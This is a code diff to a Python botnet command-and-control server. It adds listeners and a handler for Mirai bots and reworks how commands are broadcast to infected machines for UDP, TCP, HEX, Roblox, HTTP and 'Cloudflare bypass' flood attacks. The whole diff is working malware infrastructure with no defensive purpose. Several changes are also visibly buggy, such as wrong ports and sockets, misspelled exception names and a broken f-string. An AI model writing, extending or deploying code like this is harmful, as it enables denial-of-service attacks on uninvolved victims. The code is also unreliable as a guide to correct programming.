@@ -100,6 +100,7 @@ admin_methods = f"""{lightwhite}!register               {gray}Starts registratio
 {lightwhite}!user               {gray}Add/remove users"""
 
 bots = {}
+mirai_bots = {}
 user_name = ""
 ansi_clear = '\033[2J\033[H'
 
@@ -173,21 +174,29 @@ def loading(client):
 
 # Checks if bots are dead
 def ping():
-    while 1:
+    while True:
         dead_bots = []
-        for bot in bots.copy().keys():
+        for bot in list(bots.keys()):
             try:
                 bot.settimeout(3)
-                send(bot, 'PING', False, False)
-                if bot.recv(1024).decode() != 'PONG':
+                data = bot.recv(1024)
+                if not data:
+                    # Client closed connection
                     dead_bots.append(bot)
+                elif data.decode().strip().lower() == 'disconnect':
+                    # Client sent disconnect message
+                    dead_bots.append(bot)
+            except socket.timeout:
+                # No data received — assume still connected
+                continue
             except:
+                # Any other error: assume client is dead
                 dead_bots.append(bot)
-            
+
         for bot in dead_bots:
-            bots.pop(bot)
+            bots.pop(bot, None)
             bot.close()
-        time.sleep(5)
+
 
 def captcha_generator():
     a = random.randint(2, 20)
@@ -260,6 +269,119 @@ def handle_client(client, address):
                 return
         bots.update({client: address})
 
+
+# ======================================================== Mirai ================================
+
+# Mieai bot handler
+def handle_mirai_bot(client, address):
+    # Check if bot is already connected
+    for x in mirai_bots.values():
+        if x[0] == address[0]:
+            client.close()
+            return
+
+    # Register the bot
+    mirai_bots[client] = address
+
+    # Handle communication (placeholder)
+    try:
+        while True:
+            data = client.recv(1024)
+            if not data:
+                break
+            # Handle incoming data here
+            print(f"Received from {address}: {data.decode()}")
+    except Exception as e:
+        print(f"Error with {address}: {e}")
+    finally:
+        client.close()
+        mirai_bots.pop(client, None)
+
+
+
+# Send command to all bots
+def broadcastm5(data):
+    dead_bots = []
+
+    try:
+        # Split the data into 5 arguments
+        arg1, arg2, arg3, arg4, arg5 = data.split(maxsplit=4)
+        # Rebuild the formatted message
+        formatted_data = f'{arg1} {arg2} {arg3} {arg4} {arg5}'
+    except ValueError:
+        print("Error: data must contain exactly 5 arguments")
+        return
+
+    for bot in bots.keys():
+        try:
+            send(bot, f'{formatted_data} 32', False, False)
+        except:
+            dead_bots.append(bot)
+
+    for bot in dead_bots:
+        bots.pop(bot)
+        bot.close()
+
+# Send command to all bots
+def broadcastm4(data):
+    dead_bots = []
+
+    try:
+        # Split the data into 5 arguments
+        arg1, arg2, arg3, arg4 = data.split(maxsplit=3)
+        # Rebuild the formatted message
+        formatted_data = f'{arg1} {arg2} {arg3} {arg4}'
+    except ValueError:
+        print("Error: data must contain exactly 4 arguments")
+        return
+
+    for bot in bots.keys():
+        try:
+            send(bot, f'{formatted_data} 32', False, False)
+        except:
+            dead_bots.append(bot)
+
+    for bot in dead_bots:
+        bots.pop(bot)
+        bot.close()
+
+
+
+
+
+
+
+# ====================================================== Mirai End ===============================
+
+
+
+# Bot handler
+def handle_bot(client, address):
+    # Check if bot is already connected
+    for x in bots.values():
+        if x[0] == address[0]:
+            client.close()
+            return
+
+    # Register the bot
+    bots[client] = address
+
+    # Handle communication (placeholder)
+    try:
+        while True:
+            data = client.recv(1024)
+            if not data:
+                break
+            # Handle incoming data here
+            print(f"Received from {address}: {data.decode()}")
+    except Exception as e:
+        print(f"Error with {address}: {e}")
+    finally:
+        client.close()
+        bots.pop(client, None)
+
+
+
 # Send data to client or bot
 def send(socket, data, escape=True, reset=True):
     if reset:
@@ -269,16 +391,52 @@ def send(socket, data, escape=True, reset=True):
     socket.send(data.encode())
 
 # Send command to all bots
-def broadcast(data):
+def broadcast5(data):
     dead_bots = []
+
+    try:
+        # Split the data into 5 arguments
+        arg1, arg2, arg3, arg4, arg5 = data.split(maxsplit=4)
+        # Rebuild the formatted message
+        formatted_data = f'{arg1} {arg2} {arg3} {arg4} {arg5}'
+    except ValueError:
+        print("Error: data must contain exactly 5 arguments")
+        return
+
     for bot in bots.keys():
         try:
-            send(bot, f'{data} 32', False, False)
+            send(bot, f'{formatted_data} 32', False, False)
         except:
             dead_bots.append(bot)
+
     for bot in dead_bots:
         bots.pop(bot)
         bot.close()
+
+# Send command to all bots
+def broadcast4(data):
+    dead_bots = []
+
+    try:
+        # Split the data into 5 arguments
+        arg1, arg2, arg3, arg4 = data.split(maxsplit=3)
+        # Rebuild the formatted message
+        formatted_data = f'{arg1} {arg2} {arg3} {arg4}'
+    except ValueError:
+        print("Error: data must contain exactly 4 arguments")
+        return
+
+    for bot in bots.keys():
+        try:
+            send(bot, f'{formatted_data} 32', False, False)
+        except:
+            dead_bots.append(bot)
+
+    for bot in dead_bots:
+        bots.pop(bot)
+        bot.close()
+
+
 
 def user(args, send, client):
     try:
@@ -396,21 +554,21 @@ def command_line(client, username):
             elif command == "!URL_TO_IP": # Gets ip from website
                 url_to_ip(args, send, client, gray)
             elif command == '!UDP': # UDP Junk (Random UDP Data)
-                udp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data)
+                udp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast5, data)
             elif command == '!TUP': # Tcp and udp
-                tup(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data)
+                tup(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast5, data)
             elif command == '!TCP': # TCP Junk (Random TCP Data)
-                tcp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data)
+                tcp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast5, data)
             elif command == '!HEX': # Specific HEXIDECIMAL Flood
-                hex(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)
+                hex(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast4, data)
             elif command == '!ROBLOX': # Roblox flood
-                roblox(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)
+                roblox(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast4, data)
             elif command == '!JUNK': # JUNK Flood
-                junk(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)
+                junk(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast4, data)
             elif command == '!HTTP_REQ': # Http request attack
-                http_req(args, validate_time, send, client, ansi_clear, broadcast, data)
+                http_req(args, validate_time, send, client, ansi_clear, broadcast4, data)
             elif command == '!HTTP_CFB': # Http cloudflare bypass attack
-                http_cfb(args, validate_time, send, client, ansi_clear, broadcast, data)
+                http_cfb(args, validate_time, send, client, ansi_clear, broadcast4, data)
             send(client, prompt, False)
         except:
             break
@@ -490,31 +648,60 @@ def reg_main():
 def main():
     with open("src/config.json") as jsonFile:
         jsonObject = json.load(jsonFile)
-        jsonFile.close()
+
     cnc_port = int(jsonObject['cnc_port'])
     reg_port = int(jsonObject['reg_port'])
+    bot_port = int(jsonObject['bot_port'])
+    mbot_port = int(jsonObject['bot_port'])
     cnc_host = jsonObject['cnc_host']
+    bot_host = jsonObject['bot_host']
+    mbot_host = jsonObject['mirai_bot_host']
+
     if cnc_port == reg_port:
-        print("Cnc port and registration port must be different from eachother.")
-        exit()
+        print("CNC port and registration port must be different from each other.")
+        sys.exit()
+
     init(convert=True)
-    sock = socket.socket()
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+    cnc_sock = socket.socket()
+    cnc_sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+    cnc_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+    bot_sock = socket.socket()
+    bot_sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+    bot_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+    mbot_sock = socket.socket()
+    mbot_sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+    mbot_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
     print(screenedSuccessfully)
+
     try:
-        sock.bind((cnc_host, cnc_port))
-    except:
-        print('\x1b[3;31;40m Failed to bind port')
-        exit()
-    sock.listen()
-    threading.Thread(target=ping).start() # Start keepalive thread
+        cnc_sock.bind((cnc_host, cnc_port))
+        bot_sock.bind((bot_host, bot_port))
+        mbot_sock.bind((mbot_host, mbot_port))
+    except Exception as e:
+        print('\x1b[3;31;40m Failed to bind port:', e)
+        sys.exit()
+
+    cnc_sock.listen()
+    bot_sock.listen()
+    mbot_sock.listen()
+
+    threading.Thread(target=ping).start()  # Start keepalive thread
+
     # Accept all connections
-    while 1:
-        threading.Thread(target=handle_client, args=[*sock.accept()]).start()
+    while True:
+        threading.Thread(target=handle_client, args=cnc_sock.accept()).start()
+        threading.Thread(target=handle_bot, args=bot_sock.accept()).start()
+        threading.Thread(target=handle_mirai_bot, args=bot_sock.accept()).start()
+
+
+
 
 def start():
     try:
         main()
-    except:
-        print("Error, skipping..")
+    except Exeption as e:
+        print("Error, skipping..{e}")
